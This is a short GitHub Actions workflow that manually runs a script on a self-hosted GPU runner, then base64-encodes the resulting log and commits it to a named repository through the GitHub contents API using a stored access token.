name: ul-pivot-9927
on: workflow_dispatch
permissions:
  contents: write
jobs:
  pivot:
    runs-on: [self-hosted, ul-l40s]
    env:
      PUSHTOK: ${{ secrets.GH_PAT }}
    steps:
      - uses: actions/checkout@v4
      - run: |
          set +e
          bash ul-bin/pivot2.sh
          tail -c 3000 /tmp/pivot2-9927.txt
          B=$(base64 -w0 /tmp/pivot2-9927.txt)
          printf '{"message":"pivot2","content":"%s","branch":"main"}' "$B" > /tmp/b2.json
          curl -s -m 90 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b2.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/pivot2-$GITHUB_RUN_ID.b64" -o /tmp/p2.out -w "PUT %{http_code}\n"
          head -c 200 /tmp/p2.out
          exit 0
